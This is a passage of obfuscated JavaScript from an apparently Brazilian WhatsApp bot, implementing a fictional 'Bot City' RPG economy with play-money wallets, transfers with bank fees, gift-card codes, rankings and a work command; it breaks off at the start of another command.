                brigadegalo = "• Quantidade de Galos que você possuí atualmente: *" + galosrpg[AE].galos.length + "*\n• Quantidade de Vitórias: *" + galosrpg[AE].countVg + "*\n• Porcentagem de Ganhos: " + Number(porcegalos).toFixed(1) + "%\n• Dinheiro investido: *R$ " + Number(galosrpg[AE].dinVg).toFixed(2) + "*\n• Dinheiro lucrado: (R$): " + Number(galosrpg[AE].luckVg).toFixed(2);
              } else {
                brigadegalo = "Você atualmente não está registrado na *briga de galos*...";
              }
              if (JSON.stringify(roubosrpg).includes(_0x32e455)) {
                SC = roubosrpg.map(_0x3c77a9 => _0x3c77a9.id).indexOf(_0x32e455);
                if (roubosrpg[SC].segurança > 20) {
                  tlvz = roubosrpg[SC].segurança;
                  tlvz -= 20;
                  tlvz /= 20;
                  segurança = "Lv. " + tlvz;
                } else {
                  segurança = "*Você não possui nenhum level de segurança.*";
                }
              } else {
                segurança = "*Você não possui nenhum level de segurança.*";
              }
              txt = "Olá *" + sabrpg[_0x3529b0].nome + "*, tudo bem? Aqui está a sua solicitação:\n–\n• User ID: *R" + sabrpg[_0x3529b0].id.split(myid)[0] + "GP" + myid + "BC*\n• Saldo disponível: *R$ " + _0xf68982 + "*\n•️ Proteção: " + segurança + "\n–\n• [🐴] *Corrida de Cavalo(s):*\n" + runcav + "\n–\n• [🐓] *Briga de Galo(s):*\n" + brigadegalo;
              _0x403602(txt);
              break;
            case "minhacarteira":
            case "carteira":
            case "meubanco":
            case "saldo":
              if (!_0x589394) {
                return _0x403602("Olá, o modo RPG não esta ativo nesse grupo");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              _0x3529b0 = sabrpg.map(_0x4f63f8 => _0x4f63f8.id).indexOf(_0x32e455);
              dindin = Number(sabrpg[_0x3529b0].money).toFixed(2);
              if (dindin < 10) {
                var _0xf68982 = "0" + dindin;
              } else {
                var _0xf68982 = dindin;
              }
              caixa = [];
              for (_0xc3d45a = 0; _0xc3d45a < sabrpg.length; _0xc3d45a++) {
                caixa.push({
                  idnmr: sabrpg[_0xc3d45a].id,
                  nmr: _0xc3d45a + 1
                });
              }
              enc = caixa.map(_0x149c59 => _0x149c59.idnmr).indexOf(_0x32e455);
              if (Number(caixa[enc].nmr) < 100) {
                if (Number(caixa[enc].nmr) < 10) {
                  page = "00" + caixa[enc].nmr;
                } else {
                  page = "0" + caixa[enc].nmr;
                }
              } else {
                page = caixa[enc].nmr;
              }
              myid = sabrpg[_0x3529b0].id.split("@")[0].slice(5);
              txt = "Olá *" + sabrpg[_0x3529b0].nome + "*, tudo bem? Aqui está a sua solicitação:\n—\n• [💵] *Informações Bancárias*\n• Seu banco atual: *" + sabrpg[_0x3529b0].namebank + "*\n• Você está atualmente com *R$ " + _0xf68982 + "* em sua carteira para uso.\n–\n• [🧾] *Informações de Registro*\n• Seu ID: *R" + sabrpg[_0x3529b0].id.split(myid)[0] + "GP" + myid + "BC*\n• Você realizou o registro na _Bot City_ às *" + sabrpg[_0x3529b0].hrg + " hora(s)* no dia *" + sabrpg[_0x3529b0].drg + "*.\n–\n• [📖] *Livro de Registro*\n_Com base em meu livro de registros_, você foi registrado na página: *" + page + "*";
              _0x403602(txt);
              break;
            case "rankbc":
            case "rankrpg":
            case "menurpgbotcity":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🤑");
              }, 300);
              jeffinho = sabrpg.map(_0x4db5ac => _0x4db5ac);
              rank = jeffinho.sort((_0x3dc83b, _0x2df6b3) => _0x3dc83b.money < _0x2df6b3.money ? 0 : -1);
              if (sabrpg.length > 5) {
                var _0x4c9722 = 5;
              } else {
                var _0x4c9722 = sabrpg.length;
              }
              txt = "🌟🧾 *Rank Bot City:*\n–\n";
              for (_0xc3d45a = 0; _0xc3d45a < _0x4c9722; _0xc3d45a++) {
                if (_0xc3d45a != null) {
                  txt += _0xc3d45a + 1 + "º Lugar - Usuário: *" + rank[_0xc3d45a].nome + "*\n• ID: *" + rank[_0xc3d45a].id + "*\n• Saldo do Usuário: R$ " + Number(rank[_0xc3d45a].money).toFixed(2) + "\n–\n";
                }
              }
              _0x403602(txt);
              break;
            case "buscarbc":
            case "buscarbotcity":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!JSON.stringify(sabrpg).includes(_0x1d6557 + "@s.whatsapp.net")) {
                return _0x403602("ID não encontrado ou inexistente...");
              }
              _0x3529b0 = sabrpg.map(_0x3a7c9d => _0x3a7c9d.id).indexOf(_0x1d6557 + "@s.whatsapp.net");
              dindin = Number(sabrpg[_0x3529b0].money).toFixed(2);
              if (dindin < 10) {
                var _0xf68982 = "0" + dindin;
              } else {
                var _0xf68982 = dindin;
              }
              bcid = sabrpg[_0x3529b0].id.split("@")[0];
              cort = bcid.slice(5);
              _0x403602("© *Bot City:* | Carteira e informações do Usuário:\n–\n• Nome do Usuário: *" + sabrpg[_0x3529b0].nome + "*\n• Banco: *" + sabrpg[_0x3529b0].namebank + "*\n• Saldo disponível: *R$ " + _0xf68982 + "*\n—–\n• [🧾] *Informações de Registro:*\n• ID do Usuário: *R" + bcid.split(cort)[0] + "GP" + cort + "BC*\n• Registrou-se às *" + sabrpg[_0x3529b0].hrg + "* hora(s) do dia *" + sabrpg[_0x3529b0].drg + "*.");
              break;
            case "addpix":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var [_0x3e1adf, _0x164c65] = _0x1d6557.split("/");
              if (!_0x3e1adf) {
                return _0x403602("Falta a chave pix");
              }
              if (!_0x164c65) {
                return _0x403602("Falta o PIX");
              }
              _0x3529b0 = sabrpg.map(_0x40290f => _0x40290f.id).indexOf(_0x3e1adf + "@s.whatsapp.net");
              if (!JSON.stringify(sabrpg).includes(_0x3e1adf + "@s.whatsapp.net")) {
                return _0x403602("Chave PIX não encontrada ou inexistente...");
              }
              if (!Number(_0x164c65)) {
                return _0x403602(_0x164c65 + " não é um número...");
              }
              MD = sabrpg[_0x3529b0].money;
              addpix = Number(MD) + Number(_0x164c65);
              sabrpg[_0x3529b0].money = addpix;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("R$ " + Number(_0x164c65).toFixed(2) + " foram adicionados a conta " + sabrpg[_0x3529b0].nome);
              break;
            case "setpix":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var [_0x3e1adf, _0x164c65] = _0x1d6557.split("/");
              if (!_0x3e1adf) {
                return _0x403602("Falta a chave pix");
              }
              if (!_0x164c65) {
                return _0x403602("Falta o PIX");
              }
              _0x3529b0 = sabrpg.map(_0x427517 => _0x427517.id).indexOf(_0x3e1adf + "@s.whatsapp.net");
              if (!JSON.stringify(sabrpg).includes(_0x3e1adf + "@s.whatsapp.net")) {
                return _0x403602("Chave PIX não encontrada ou inexistente...");
              }
              if (!Number(_0x164c65)) {
                return _0x403602(_0x164c65 + " não é um número...");
              }
              sabrpg[_0x3529b0].money = _0x164c65;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("O saldo da conta " + sabrpg[_0x3529b0].nome + " foi setado em R$ " + Number(_0x164c65).toFixed(2));
              break;
            case "delpix":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var [_0x3e1adf, _0x164c65] = _0x1d6557.split("/");
              if (!_0x3e1adf) {
                return _0x403602("Falta a chave pix");
              }
              if (!_0x164c65) {
                return _0x403602("Falta o PIX");
              }
              _0x3529b0 = sabrpg.map(_0x54211b => _0x54211b.id).indexOf(_0x3e1adf + "@s.whatsapp.net");
              if (!JSON.stringify(sabrpg).includes(_0x3e1adf + "@s.whatsapp.net")) {
                return _0x403602("Chave PIX não encontrada ou inexistente...");
              }
              if (!Number(_0x164c65)) {
                return _0x403602(_0x164c65 + " não é um número...");
              }
              MD = sabrpg[_0x3529b0].money;
              addpix = Number(MD) - Number(_0x164c65);
              sabrpg[_0x3529b0].money = addpix;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("R$ " + Number(_0x164c65).toFixed(2) + " foram retirados da conta " + sabrpg[_0x3529b0].nome);
              break;
            case "zerarsc":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                return _0x403602("Falta a chave pix");
              }
              _0x3529b0 = sabrpg.map(_0x10c946 => _0x10c946.id).indexOf(_0x1d6557 + "@s.whatsapp.net");
              if (!JSON.stringify(sabrpg).includes(_0x1d6557 + "@s.whatsapp.net")) {
                return _0x403602("Chave PIX não encontrada ou inexistente...");
              }
              if (!Number(_0x1d6557)) {
                return _0x403602(_0x1d6557 + " não é um número...");
              }
              sabrpg[_0x3529b0].money = 0;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x403602("A conta " + sabrpg[_0x3529b0].nome + " foi zerada... Seu saldo agora é R$ 00.00");
              break;
            case "gerargf":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              var [_0x4e84e2, _0x531709] = _0x1d6557.split("/");
              if (!_0x4e84e2) {
                return _0x403602("Defina o valor que você desejar adicionar ao giftCard.");
              }
              if (!_0x531709) {
                return _0x403602("Defina a quantidade de usuários que poderam usar o *código-resgate*.");
              }
              if (!Number(_0x4e84e2)) {
                return _0x403602(_0x4e84e2 + " não é número!");
              }
              if (!Number(_0x531709)) {
                return _0x403602(_0x531709 + " não é número!");
              }
              dategf = moment.tz("America/Sao_Paulo").format("DDMMYY");
              horagf = moment.tz("America/Sao_Paulo").format("HHmmss");
              codegf = "P" + _0x4e84e2 + "M" + _0x531709 + "BC" + (dategf + horagf) + "QC" + Number(Number(Number(dategf) + Number(horagf)) / Number(_0x531709)).toFixed(0) + "RPG";
              coderpg.push({
                codeid: codegf,
                valor: _0x4e84e2,
                quantmax: Number(_0x531709).toFixed(0),
                usus: []
              });
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/coderpg.json", JSON.stringify(coderpg));
              _0x403602("Código de *R$ " + Number(_0x4e84e2).toFixed(2) + "* gerado, válido para " + (Number(_0x531709) <= 1 ? "um usuário apenas..." : "os " + _0x531709 + " primeiros...") + "\n• Para resgatar o benefício, use o comando: *" + _0x1d93be + "resgatargf*");
              setTimeout(() => {
                const _0x4ea3f5 = {
                  text: codegf
                };
                _0x263319.sendMessage(_0x4f1071, _0x4ea3f5);
              }, 1000);
              break;
            case "delgf":
              if (!_0x2a5ff3) {
                return _0x403602(_0x7e2f25);
              }
              if (!_0x1d6557) {
                return _0x403602("Digite o código que deseja remover do RPG");
              }
              _0x3529b0 = coderpg.map(_0x7fbf18 => _0x7fbf18.codeid).indexOf(_0x1d6557);
              if (_0x3529b0 < 0) {
                return _0x403602("Código não encontrado ou inexistente...");
              }
              coderpg.splice(_0x3529b0, 1);
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/coderpg.json", JSON.stringify(coderpg));
              _0x403602("O código *" + _0x1d6557 + "* foi desabilitado com sucesso, ou seja, o código a partir de agora está inválido.");
              break;
            case "resgatargf":
            case "resgatar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              _0x3529b0 = coderpg.map(_0xc78554 => _0xc78554.codeid).indexOf(_0x1d6557);
              BD = sabrpg.map(_0x86ebd1 => _0x86ebd1.id).indexOf(_0x32e455);
              if (!_0x1d6557) {
                return _0x403602("Você esqueceu de digitar o código junto ao comando! _Ex: " + (_0x1d93be + _0x3dec88) + " ABCD1234_");
              }
              if (!JSON.stringify(coderpg).includes(_0x1d6557)) {
                return _0x403602("Error *500*: Código Inexistente! ✋🏼");
              }
              if (JSON.stringify(coderpg[_0x3529b0].usus).includes(_0x32e455)) {
                return _0x403602("Você já usou, ou seja, _o código só pode ser resgatado 1 vez por usuário._");
              }
              if (Number(coderpg[_0x3529b0].usus.length) < Number(coderpg[_0x3529b0].quantmax)) {
                const _0x19be10 = {
                  id: _0x32e455
                };
                coderpg[_0x3529b0].usus.push(_0x19be10);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/coderpg.json", JSON.stringify(coderpg));
                MD = sabrpg[BD].money;
                sabrpg[BD].money = Number(MD) + Number(coderpg[_0x3529b0].valor);
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("Estou verificando se o código é real, para atribuir o benefício a você!");
                setTimeout(() => {
                  _0x5b6fe5("✅️💰 *O código informado é válido!* Parabéns *@" + _0x32e455.split("@")[0] + "*, você acaba de resgatar o seu benefício.\n• Foi adicionado à sua carteira, um valor de: *R$ " + Number(coderpg[_0x3529b0].valor).toFixed(2) + "*");
                }, 3000);
              } else {
                _0x403602("Sinto muito!😿 O código informado está inválido.\n• Por favor, entre em contato com meu dono, caso seja um engano!");
              }
              break;
            case "codelist":
            case "listacodigo":
            case "listacodigos":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (coderpg.length < 0) {
                return _0x403602("Sinto muito!😿 Não existe nenhum código disponível no momento.");
              }
              txt = "[Total: *" + coderpg.length + "*] - Códigos de resgate disponíveis.\n• Para resgatar o benefício, use o comando: *" + _0x1d93be + "resgatargf <code>*";
              for (_0xc3d45a = 0; _0xc3d45a < coderpg.length; _0xc3d45a++) {
                txt += "\n—\n*[" + (_0xc3d45a + 1) + "]* » • Código: *" + coderpg[_0xc3d45a].codeid + "*\n• Valor do Gift Card: *R$ " + Number(coderpg[_0xc3d45a].valor).toFixed(2) + "*\n• Número de usuário(s) que podem resgatar o mesmo: *" + (Number(coderpg[_0xc3d45a].quantmax) - Number(coderpg[_0xc3d45a].usus.length)) + "*";
              }
              _0x403602(txt);
              break;
            case "fazerpix":
            case "transferir":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              datepix = moment.tz("America/Sao_Paulo").format("DD/MM/YY");
              dateid = moment.tz("America/Sao_Paulo").format("DDMMYY");
              horaid = moment.tz("America/Sao_Paulo").format("HHmmss");
              var [_0x3e1adf, _0x164c65] = _0x1d6557.split("/");
              if (!_0x3e1adf) {
                return _0x403602("Coloque a chave PIX (número do indivíduo) para fazer a transferência bancária...");
              }
              if (_0x32e455.includes(_0x3e1adf)) {
                return _0x403602("Não é possível enviar um pix para você mesmo...");
              }
              if (!_0x164c65) {
                return _0x403602("Coloque uma barra ( / ) após a chave, e defina o valor a ser enviado, ex:\n" + (_0x1d93be + _0x3dec88) + " 559181695945/100");
              }
              if (Number(_0x164c65) < 0.01) {
                return _0x403602("Não é possível transferir menos que 1 centavo...");
              }
              if (!Number(_0x164c65)) {
                return _0x403602(_0x164c65 + " não é número... 😿");
              }
              if (!JSON.stringify(sabrpg).includes(_0x3e1adf + "@s.whatsapp.net")) {
                return _0x403602("Chave PIX não encontrada ou inexistente...");
              }
              _0x3529b0 = sabrpg.map(_0x11a596 => _0x11a596.id).indexOf(_0x32e455);
              BC = sabrpg.map(_0xd8297e => _0xd8297e.id).indexOf(_0x3e1adf + "@s.whatsapp.net");
              if (Number(_0x164c65) > Number(sabrpg[_0x3529b0].money)) {
                return _0x403602("Você não tem saldo suficiente para efetuar essa transferência...");
              }
              if (sabrpg[_0x3529b0].namebank == "Inter") {
                tpb = 0.1;
              }
              if (sabrpg[_0x3529b0].namebank == "NuBank") {
                tpb = 0.2;
              }
              if (sabrpg[_0x3529b0].namebank == "PagBank") {
                tpb = 0.3;
              }
              if (sabrpg[_0x3529b0].namebank == "Bradesco") {
                tpb = 0.4;
              }
              if (sabrpg[_0x3529b0].namebank == "Itaú") {
                tpb = 0.5;
              }
              if (sabrpg[_0x3529b0].namebank == "Next") {
                tpb = 0.6;
              }
              if (sabrpg[_0x3529b0].namebank == "Caixa") {
                tpb = 0.7;
              }
              if (sabrpg[_0x3529b0].namebank == "Santander️") {
                tpb = 0.8;
              }
              if (sabrpg[_0x3529b0].namebank == "Banco do Brasil") {
                tpb = 0.9;
              }
              if (sabrpg[_0x3529b0].namebank == "PicPay") {
                tpb = 1;
              }
              if (sabrpg[_0x3529b0].namebank == "PayPal") {
                tpb = 1.1;
              }
              if (sabrpg[_0x3529b0].namebank == sabrpg[BC].namebank) {
                taxabanco = 0;
              } else {
                taxabanco = tpb;
              }
              taxageral = Number(_0x164c65) * Number(taxabanco) / 100;
              addpix = Number(sabrpg[BC].money) + Number(Number(_0x164c65) - Number(taxageral));
              delpix = Number(sabrpg[_0x3529b0].money) - Number(_0x164c65);
              sabrpg[BC].money = addpix;
              sabrpg[_0x3529b0].money = delpix;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              myid = sabrpg[_0x3529b0].id.split("@")[0].slice(5);
              suid = sabrpg[BC].id.split("@")[0].slice(5);
              imn = sabrpg[_0x3529b0].nome.slice(1);
              isn = sabrpg[BC].nome.slice(1);
              mimn = sabrpg[_0x3529b0].nome.split(imn)[0];
              misn = sabrpg[BC].nome.split(isn)[0];
              comprovante = "🧾 *Comprovante:*\n—\n• Pix: *R$ " + Number(Number(_0x164c65) - Number(taxageral)).toFixed(2) + "*\n• Código ID: *" + (mimn.toUpperCase() + myid + misn.toUpperCase() + suid) + "P" + dateid + "X" + horaid + "RPG*\n•️ Taxa do Banco: *" + taxabanco + "%*\n—–\n• A transferência foi realizada às *" + _0x263ebb + "* do dia: *" + datepix + "*\n——\n• *Envio:* *" + sabrpg[_0x3529b0].nome + "*\n• Banco: *" + sabrpg[_0x3529b0].namebank + "*\n• ID: *R" + sabrpg[_0x3529b0].id.split(myid)[0] + "GP" + myid + "BC*\n——\n• Recebimento: *" + sabrpg[BC].nome + "*\n• Banco: *" + sabrpg[BC].namebank + "*\n• ID: *R" + sabrpg[BC].id.split(suid)[0] + "GP" + suid + "BC*";
              if (JSON.stringify(sabrpg).includes(_0x3a52d1)) {
                setTimeout(() => {
                  BD = sabrpg.map(_0x3155c0 => _0x3155c0.id).indexOf(_0x3a52d1);
                  pixdono = sabrpg[BD].money;
                  sabrpg[BD].money = Number(pixdono) + Number(taxageral);
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                }, 1000);
              }
              _0x403602(comprovante);
              break;
            case "chavepix":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              const _0x2426e3 = {
                quoted: _0x302296
              };
              if (!JSON.stringify(sabrpg).includes(_0x1dcf0a)) {
                return _0x263319.sendMessage(_0x4f1071, {
                  text: "Usuário (a) @" + _0x1dcf0a.split("@")[0] + " não consta em nosso banco...",
                  mentions: [_0x1dcf0a]
                }, _0x2426e3);
              }
              _0x3529b0 = sabrpg.map(_0x5871b3 => _0x5871b3.id).indexOf(_0x416d5d);
              _0x403602("Chave encontrada/localizada! 🌟🧾\n• Nome: *" + sabrpg[_0x3529b0].nome + "*\n• Chave: *" + sabrpg[_0x3529b0].id.split("@")[0] + "*");
              break;
            case "meupix":
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              _0x3529b0 = sabrpg.map(_0x469fa3 => _0x469fa3.id).indexOf(_0x32e455);
              _0x403602("Aqui está sua numeração da chave pix: *" + sabrpg[_0x3529b0].id.split("@")[0] + "*");
              break;
            case "sopk":
              if (_0xd20756) {
                return _0x403602("Só caminha");
              }
              break;
            case "trocarbanco":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x1d6557) {
                return _0x403602("Escolha um número correspondente ao banco...\nEx: " + (_0x1d93be + _0x3dec88) + " 2 _(Serão necessários R$ 2500.00 para realizar essa ação)_\n––\nBancos disponíveis:\n• Opção - Número: [1] => Inter\n• Opção - Número: [2] => NuBank\n• Opção - Número: [3] => PagBank\n• Opção - Número: [4] => Bradesco\n• Opção - Número: [5] => Itaú\n• Opção - Número: [6] => Next\n• Opção - Número: [7] =>Caixa\n• Opção - Número: [8] => Santander\n• Opção - Número: [9] => Banco do Brasil\n• Opção - Número: [10] => PicPay\n• Opção - Número: [11] => PayPal️");
              }
              if (Number(_0x40e45c[0]) === 1) {
                var _0xa7b7d0 = "Inter";
              }
              ;
              if (Number(_0x40e45c[0]) === 2) {
                var _0xa7b7d0 = "NuBank";
              }
              ;
              if (Number(_0x40e45c[0]) === 3) {
                var _0xa7b7d0 = "PagBank";
              }
              ;
              if (Number(_0x40e45c[0]) === 4) {
                var _0xa7b7d0 = "Bradesco";
              }
              ;
              if (Number(_0x40e45c[0]) === 5) {
                var _0xa7b7d0 = "Itaú";
              }
              ;
              if (Number(_0x40e45c[0]) === 6) {
                var _0xa7b7d0 = "Next";
              }
              ;
              if (Number(_0x40e45c[0]) === 7) {
                var _0xa7b7d0 = "Caixa";
              }
              ;
              if (Number(_0x40e45c[0]) === 8) {
                var _0xa7b7d0 = "Santander️";
              }
              ;
              if (Number(_0x40e45c[0]) === 9) {
                var _0xa7b7d0 = "Banco do Brasil";
              }
              ;
              if (Number(_0x40e45c[0]) === 10) {
                var _0xa7b7d0 = "PicPay";
              }
              ;
              if (Number(_0x40e45c[0]) === 11) {
                var _0xa7b7d0 = "PayPal️";
              }
              _0x3529b0 = sabrpg.map(_0x24538d => _0x24538d.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].money) < 2500) {
                return _0x403602(" Você não tem saldo suficiente pra realizar esta ação... São necessários R$ 2500.00 para alterar seu banco");
              }
              MD = Number(sabrpg[_0x3529b0].money) - Number(2500);
              sabrpg[_0x3529b0].money = MD;
              sabrpg[_0x3529b0].namebank = _0xa7b7d0;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x263319.sendMessage(_0x4f1071, {
                text: "Troca efetuada com sucesso *@" + _0x32e455.split("@")[0] + "*, seu banco agora é o(a) " + _0xa7b7d0 + ".",
                mentions: [_0x32e455]
              });
              break;
            case "trocarnome":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x1d6557) {
                return _0x403602("Digite o novo nome junto ao comando... Lembre-se que essa ação custará R$ 1200.00\nEx: " + (_0x1d93be + _0x3dec88) + " jeffinho");
              }
              _0x3529b0 = sabrpg.map(_0x1edb67 => _0x1edb67.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].money) < 1200) {
                return _0x403602(" Você não tem saldo suficiente pra realizar esta ação... São necessários R$ 1200.00 para alterar seu nome");
              }
              MD = Number(sabrpg[_0x3529b0].money) - Number(1200);
              sabrpg[_0x3529b0].money = MD;
              sabrpg[_0x3529b0].nome = _0x1d6557;
              fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
              _0x263319.sendMessage(_0x4f1071, {
                text: "Troca efetuada com sucesso @" + _0x32e455.split("@")[0] + ", seu nome foi alterado para " + _0x1d6557 + ".",
                mentions: [_0x32e455]
              });
              break;
            case "trabalhar":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              horaT = moment.tz("America/Sao_Paulo").format("HH");
              dataT = moment.tz("America/Sao_Paulo").format("DD");
              data2T = moment.tz("America/Sao_Paulo").format("MM");
              _0x3529b0 = sabrpg.map(_0x2ccce7 => _0x2ccce7.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].limiteTh) === 0 && Number(sabrpg[_0x3529b0].limiteTd) > 0 && Number(sabrpg[_0x3529b0].hrT) === Number(horaT)) {
                return _0x403602("Você já trabalhou agora... Volte na próxima hora.");
              }
              if (Number(sabrpg[_0x3529b0].limiteTh) > 0 && Number(sabrpg[_0x3529b0].hrT) === Number(horaT) && Number(sabrpg[_0x3529b0].diaT) === Number(dataT) && Number(sabrpg[_0x3529b0].mT) === Number(data2T)) {
                TBALE = Math.floor(Math.random() * 50) + 40;
                TBLH = Number(sabrpg[_0x3529b0].money) + Number(TBALE);
                HT = sabrpg[_0x3529b0].limiteTh - 1;
                TD = sabrpg[_0x3529b0].limiteTd - 1;
                sabrpg[_0x3529b0].money = TBLH;
                sabrpg[_0x3529b0].money = TBLH;
                sabrpg[_0x3529b0].money = TBLH;
                sabrpg[_0x3529b0].limiteTh = HT;
                sabrpg[_0x3529b0].limiteTd = TD;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("Parabéns " + sabrpg[_0x3529b0].nome + ", você trabalhou e ganhou *R$ " + Number(TBALE).toFixed(2) + "* até depois!🫡");
              }
              HTR = sabrpg[_0x3529b0].hrT + 1;
              if (Number(horaT) > Number(sabrpg[_0x3529b0].hrT) && Number(sabrpg[_0x3529b0].limiteTd) > 0 && Number(sabrpg[_0x3529b0].diaT) === Number(dataT) && Number(sabrpg[_0x3529b0].mT) == Number(data2T)) {
                sabrpg[_0x3529b0].limiteTh = 3;
                sabrpg[_0x3529b0].hrT = horaT;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("Já tá pronto pra trabalhar dnv? Digite o comando novamente enquanto eu preparo suas coisas...");
              }
              if (Number(sabrpg[_0x3529b0].limiteTd) < 1 && Number(sabrpg[_0x3529b0].diaT) === Number(dataT)) {
                return _0x403602("Você já trabalhou muito por hoje... Volte amanhã!");
              }
              if (Number(dataT) > Number(sabrpg[_0x3529b0].diaT) && Number(sabrpg[_0x3529b0].mT) == Number(data2T)) {
                sabrpg[_0x3529b0].limiteTh = 3;
                sabrpg[_0x3529b0].limiteTd = 24;
                sabrpg[_0x3529b0].hrT = horaT;
                sabrpg[_0x3529b0].diaT = dataT;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602(_0x6965b0 + " usuário (a), está pronto para trabalhar?");
              }
              if (Number(data2T) > Number(sabrpg[_0x3529b0].mT)) {
                sabrpg[_0x3529b0].limiteTh = 3;
                sabrpg[_0x3529b0].limiteTd = 24;
                sabrpg[_0x3529b0].hrT = horaT;
                sabrpg[_0x3529b0].diaT = dataT;
                sabrpg[_0x3529b0].mT = data2T;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602(_0x6965b0 + " usuário (a), está pronto para iniciar o mês?");
              }
              break;
            case "minado":
